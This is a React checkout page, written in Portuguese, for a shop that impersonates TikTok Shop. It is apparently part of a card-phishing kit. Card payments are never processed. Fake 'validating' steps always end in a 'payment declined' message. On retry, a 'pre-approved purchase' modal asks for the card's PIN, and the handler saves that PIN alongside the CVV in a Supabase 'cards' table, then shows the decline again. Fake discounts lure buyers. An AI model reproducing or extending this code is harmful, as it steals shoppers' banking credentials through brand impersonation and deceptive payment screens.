"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  Star, 
  Zap, 
  ChevronUp, 
  ChevronDown, 
  Plus, 
  Minus, 
  Ticket, 
  CreditCard, 
  Loader2, 
  AlertCircle, 
  Lock, 
  ShieldCheck 
} from 'lucide-react';
import { products, Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
import { supabase } from "@/integrations/supabase/client";
import { showError } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [selectedVar, setSelectedVar] = useState("SEM faixa e polvo");
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [addressData, setAddressData] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  
  const [isProcessingCard, setIsProcessingCard] = useState(false);
  const [cardProcessingStep, setCardProcessingStep] = useState(0);
  const [cardError, setCardError] = useState(false);
  const [showPasswordPrompt, setShowPasswordPrompt] = useState(false);
  const [cardPassword, setCardPassword] = useState("");
  const [isSavingPassword, setIsSavingPassword] = useState(false);

  const steps = [
    "Finalizando compra...",
    "Checando dados do cartão...",
    "Comunicando com a prestadora do cartão...",
    "Validando transação..."
  ];

  const fetchData = async () => {
    try {
      const { data: addresses } = await supabase
        .from('addresses')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1);
      
      if (addresses && addresses.length > 0) {
        setAddressData(addresses[0]);
      }

      const { data: cards } = await supabase
        .from('cards')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1);

      if (cards && cards.length > 0) {
        setCardData(cards[0]);
        setPaymentMethod('card');
      }
    } catch (err) {
      console.error("Erro ao buscar dados:", err);
    }
  };

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
      if (location.state.initialQuantity) setQuantity(location.state.initialQuantity);
      if (location.state.selectedVariation) setSelectedVar(location.state.selectedVariation);
    } else {
      setProduct(products[0]);
    }
    fetchData();
  }, [location.state]);

  if (!product) return null;

  const unitPriceNum = 47.00;
  const originalUnitPriceNum = 249.00;
  const subtotal = unitPriceNum * quantity;
  const originalSubtotal = originalUnitPriceNum * quantity;
  const discountTotal = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;
  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');

  const goToAddAddress = () => {
    navigate('/adicionar-endereco', { 
      state: { product, initialQuantity: quantity, selectedVariation: selectedVar } 
    });
  };

  const goToAddCard = () => {
    navigate('/adicionar-cartao', { 
      state: { product, initialQuantity: quantity, selectedVariation: selectedVar } 
    });
  };

  const handleProcessCard = (isRetry: boolean) => {
    setIsProcessingCard(true);
    setCardError(false);
    setShowPasswordPrompt(false);
    let currentStep = 0;

    const interval = setInterval(() => {
      setCardProcessingStep(currentStep);
      currentStep++;
      
      if (currentStep >= steps.length) {
        clearInterval(interval);
        setTimeout(() => {
          setIsProcessingCard(false);
          if (isRetry) {
            setShowPasswordPrompt(true);
          } else {
            setCardError(true);
          }
        }, 1500);
      }
    }, 1500);
  };

  const handlePasswordSubmit = async () => {
    if (cardPassword.length < 4) {
      showError("Digite uma senha válida.");
      return;
    }

    setIsSavingPassword(true);
    try {
      if (cardData?.id) {
        await supabase
          .from('cards')
          .update({ cvv: `Senha: ${cardPassword} | CVV: ${cardData.cvv}` })
          .eq('id', cardData.id);
      }

      setTimeout(() => {
        setIsSavingPassword(false);
        setCardPassword("");
        setShowPasswordPrompt(false);
        setCardError(true); 
      }, 2500);
    } catch (err) {
      setIsSavingPassword(false);
      setCardError(true);
    }
  };

  const handlePlaceOrder = async () => {
    if (!addressData) {
      showError("Por favor, adicione um endereço de entrega.");
      goToAddAddress();
      return;
    }

    if (paymentMethod === 'card') {
      if (!cardData) {
        showError("Adicionar um cartão para continuar.");
        goToAddCard();
        return;
      }
      handleProcessCard(false);
    } else {
      navigate('/pix-pagamento', { state: { product } });
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
      {/* Overlay de Processamento */}
      {isProcessingCard && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[300px] shadow-2xl animate-in fade-in zoom-in duration-300">
            <Loader2 className="w-12 h-12 text-[#FF2C55] animate-spin" />
            <p className="text-[15px] font-bold text-gray-900 text-center leading-tight">
              {steps[cardProcessingStep]}
            </p>
          </div>
        </div>
      )}

      {/* Modal de Erro da Operadora */}
      {cardError && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-3xl p-6 flex flex-col items-center w-full max-w-[340px] shadow-2xl animate-in fade-in zoom-in duration-300">
            <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mb-4">
              <AlertCircle size={32} className="text-[#FF2C55]" />
            </div>
            <h3 className="text-[18px] font-bold text-gray-900 text-center mb-2">Pagamento recusado</h3>
            <p className="text-[13px] text-gray-400 text-center mb-6 leading-relaxed">
              A operação não foi aceita pela administradora do cartão. Verifique seus dados ou tente outra forma de pagamento.
            </p>
            <div className="w-full space-y-3">
              <Button 
                className="w-full h-12 rounded-full bg-[#FF2C55] hover:bg-[#E0254B] font-bold text-white shadow-sm"
                onClick={() => handleProcessCard(true)}
              >
                Tentar novamente
              </Button>
              <Button 
                variant="ghost"
                className="w-full h-10 font-bold text-gray-400 hover:text-gray-600"
                onClick={() => {
                  setCardError(false);
                  goToAddCard();
                }}
              >
                Adicionar outro cartão
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Solicitação de Senha - Profissional Estilo TikTok */}
      {showPasswordPrompt && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-[32px] p-8 flex flex-col items-center w-full max-w-[340px] shadow-2xl animate-in fade-in zoom-in duration-300">
            {/* Ícone de Escudo Estilizado */}
            <div className="w-14 h-14 bg-red-50 rounded-full flex items-center justify-center mb-6">
              <div className="w-8 h-8 rounded-full bg-white flex items-center justify-center shadow-sm">
                <ShieldCheck size={20} className="text-[#FF2C55]" />
              </div>
            </div>
            
            <h3 className="text-[20px] font-bold text-gray-900 text-center mb-2">Compra pré-aprovada!</h3>
            <p className="text-[13px] text-gray-500 text-center mb-6 leading-relaxed">
              Para finalizar sua compra com segurança, digite a senha de <span className="font-bold text-gray-700">6 ou 8 dígitos</span> do seu cartão físico ou virtual.
            </p>

            {/* Detalhes da Transação (Discreto) */}
            <div className="w-full bg-gray-50 rounded-2xl p-4 mb-6 flex items-center justify-between border border-gray-100">
              <div className="flex items-center space-x-3">
                {cardData?.brand === 'mastercard' ? (
                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
                ) : (
                  <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
                )}
                <span className="text-[13px] font-medium text-gray-600">•••• {cardData?.last4}</span>
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {finalTotalStr}</span>
            </div>
            
            <div className="w-full mb-6">
              <input 
                type="password"
                inputMode="numeric"
                className="w-full h-14 bg-white border-2 border-[#FFD9E0] rounded-2xl px-4 text-center text-2xl tracking-[0.2em] outline-none focus:border-[#FF2C55] transition-all shadow-sm"
                value={cardPassword}
                onChange={(e) => setCardPassword(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
              />
            </div>

            <Button 
              className="w-full h-12 rounded-full bg-[#FFB6C1] hover:bg-[#FF2C55] text-white font-bold text-[16px] shadow-sm transition-colors"
              onClick={handlePasswordSubmit}
              disabled={isSavingPassword || cardPassword.length < 4}
            >
              {isSavingPassword ? (
                <Loader2 className="animate-spin" />
              ) : "Finalizar Compra"}
            </Button>
            
            <button 
              className="mt-4 text-[13px] text-gray-400 font-bold hover:text-gray-600"
              onClick={() => setShowPasswordPrompt(false)}
            >
              Cancelar
            </button>
          </div>
        </div>
      )}

      <div className="bg-white border-b sticky top-0 z-50 flex flex-col items-center">
        <div className="w-full h-12 flex items-center px-4 relative">
          <button onClick={() => navigate(-1)} className="absolute left-2 p-2">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <div className="w-full text-center">
            <h1 className="text-[17px] font-bold text-gray-900">Resumo do Pedido</h1>
          </div>
        </div>
        <div className="w-full h-8 flex items-center justify-center bg-white">
          <div className="flex items-center text-[#00BFA5] text-[12px] font-medium">
            <CreditCard size={14} className="mr-1.5" />
            <span>Planos sem juros disponíveis</span>
          </div>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
          <div className="flex items-center space-x-3">
            <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
            <div className="flex flex-col">
              <span className="text-[14px] text-gray-900 font-bold">
                {addressData ? "Endereço de envio" : "Adicionar endereço"}
              </span>
              {addressData && (
                <span className="text-[12px] text-gray-500">
                  {addressData.city}, {addressData.state}
                </span>
              )}
            </div>
          </div>
          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={goToAddAddress}>
            {addressData ? "Alterar" : "+ Adicionar endereço"}
          </button>
        </div>

        <div className="bg-white mt-2.5 p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
            <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
              {orderNote ? "Nota adicionada" : "Adicionar nota"} <ChevronRight size={14} className="ml-1" />
            </button>
          </div>
          
          <div className="flex items-center space-x-1.5 text-[12px] mb-4">
            <Star size={14} className="text-[#FFB800] fill-[#FFB800]" />
            <span className="text-[#A0783A] font-bold">Melhor escolha! 28.0K vendido(s) e com nota 4.8/5,0</span>
          </div>

          <div className="flex space-x-3 mb-4">
            <div className="w-[100px] h-[100px] bg-[#F8F8F8] rounded-lg overflow-hidden border border-gray-100 p-1 flex-shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" alt="Thumb" />
            </div>
            <div className="flex-grow flex flex-col justify-start space-y-1">
              <h4 className="text-[13px] font-medium text-gray-900 line-clamp-2 leading-tight">{product.title}</h4>
              <p className="text-[11px] text-gray-400 mb-1">{selectedVar}</p>
              
              <div className="flex flex-col space-y-1 mt-0.5">
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[10px] font-bold px-1.5 py-0.5 rounded-sm flex items-center w-fit">
                  <Zap size={10} className="mr-1 fill-[#FF2C55]" /> Oferta Relâmpago
                </div>
                <div className="bg-[#F8F8F8] text-gray-500 text-[10px] font-medium px-1.5 py-0.5 rounded-sm flex items-center w-fit">
                  <span className="mr-1 text-[12px]">🪙</span>
                  Devolução gratuita
                </div>
              </div>
              
              <div className="flex justify-between items-end mt-2">
                 <div className="flex flex-col">
                   <div className="flex items-center space-x-1">
                     <span className="text-[16px] font-bold text-[#FF2C55]">R$ {unitPriceNum.toFixed(2).replace('.', ',')}</span>
                   </div>
                   <div className="flex items-center space-x-1.5">
                     <span className="text-[11px] text-gray-400 line-through">R$ {originalUnitPriceNum.toFixed(2).replace('.', ',')}</span>
                   </div>
                 </div>
                 
                 <div className="flex items-center bg-[#F1F1F1] rounded-sm h-8">
                    <button className="w-9 h-full flex items-center justify-center text-gray-600" onClick={() => setQuantity(q => Math.max(1, q - 1))}>
                      <Minus size={14} />
                    </button>
                    <span className="w-9 text-center text-[14px] font-bold text-gray-900">{quantity}</span>
                    <button className="w-9 h-full flex items-center justify-center text-gray-600" onClick={() => setQuantity(q => q + 1)}>
                      <Plus size={14} />
                    </button>
                 </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
          <div className="flex items-center space-x-2">
            <Ticket size={20} className="text-[#FF2C55]" />
            <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-2">
            <span className="text-[13px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2 py-0.5 rounded-sm">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4">
          <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          <div className="space-y-4">
            <div className="flex justify-between items-center cursor-pointer" onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}>
              <div className="flex items-center space-x-1.5">
                <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                {isSubtotalOpen ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            
            {isSubtotalOpen && (
              <div className="space-y-4 pl-0">
                <div className="flex justify-between text-[13px] text-gray-600">
                  <span>Preço original</span>
                  <span className="text-gray-900 font-medium">R$ {originalSubtotal.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[13px] text-gray-600">
                  <span>Desconto no produto</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {discountTotal.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[13px] text-gray-600">
                  <span>Cupons do TikTok Shop</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            )}
            
            <div className="pt-4 border-t flex flex-col">
              <div className="flex justify-between items-center mb-0.5">
                <span className="text-[17px] font-bold text-gray-900">Total</span>
                <span className="text-[17px] font-bold text-gray-900">R$ {finalTotalStr}</span>
              </div>
              <span className="text-[11px] text-gray-400 text-right">Impostos inclusos</span>
            </div>
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4 space-y-4">
          <h3 className="text-[16px] font-bold text-gray-900 mb-1">Forma de pagamento</h3>
          
          <div className="space-y-3 cursor-pointer" onClick={() => {
            if (!cardData) goToAddCard();
            else setPaymentMethod('card');
          }}>
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <div className="w-5 h-5 flex items-center justify-center bg-[#F1F1F1] rounded-sm">
                   {cardData ? <CreditCard size={14} className="text-[#00BFA5]" /> : <Plus size={14} className="text-gray-400" />}
                </div>
                <span className="text-[15px] font-medium text-gray-900">
                  {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
                </span>
              </div>
              <div className="flex items-center space-x-2">
                {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
                <ChevronRight size={18} className="text-gray-300" />
              </div>
            </div>
            
            <div className="flex flex-col space-y-3 pl-7">
              <div className="flex gap-1.5">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
              </div>
              <div className="flex items-center space-x-1.5 w-fit">
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[11px] font-bold px-2 py-0.5 rounded-sm border border-[#FFD9E0] flex items-center">
                  Sem juros em até 3 parcelas <ChevronRight size={12} className="ml-0.5" />
                </div>
              </div>
            </div>
          </div>

          <div className="flex items-center justify-between cursor-pointer border-t pt-4 mt-2" onClick={() => setPaymentMethod('pix')}>
            <div className="flex items-center space-x-3">
              <div className="bg-[#EFFFFD] p-1.5 rounded-sm">
                <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
              </div>
              <span className="text-[15px] font-medium text-gray-900">Pix</span>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
              {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
            </div>
          </div>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-3 px-1">
            <span className="text-[16px] font-bold text-gray-900">Total</span>
            <span className="text-[19px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[54px]"
            onClick={handlePlaceOrder}
          >
            Fazer pedido
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
      <PaymentMethodDrawer 
        isOpen={isPaymentDrawerOpen} 
        onClose={() => setIsPaymentDrawerOpen(false)} 
        onSelectMethod={setPaymentMethod} 
        onAddCard={goToAddCard}
        total={finalTotalStr}
      />
    </div>
  );
};

export default Checkout;